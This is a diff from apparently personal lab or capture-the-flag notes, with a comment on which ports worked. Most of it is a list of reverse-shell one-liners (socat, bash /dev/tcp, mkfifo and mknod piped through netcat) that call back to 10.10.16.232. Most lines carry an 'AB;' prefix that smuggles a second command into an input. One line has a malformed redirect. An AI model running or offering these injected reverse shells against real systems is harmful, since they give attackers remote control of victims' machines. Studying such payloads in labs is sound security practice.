@@ -88,6 +88,15 @@ the
 
 ![Image 5]()
 
-// Lets try this 
+// Lets try this (tried with port 1444, but didnt work , so tried port 443 and it worked)
 
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.16.232 1444 >/tmp/f
+socat file:`tty`,raw,echo=0 tcp-listen:1444
+AB; socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.16.232:1444
+
+AB; sh -i >& /dev/tcp/10.10.16.232/1445 0>&1
+AB; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.16.232 443 >/tmp/f
+AB; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.16.232 1444 >/tmp/f
+AB; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.16.232 9001 >/tmp/f
+
+/bin/sh | nc 10.10.10.117 1444
+AB; rm -f /tmp/p; mknod /tmp/p p && nc 10.10.16.232 1444 0/tmp/p
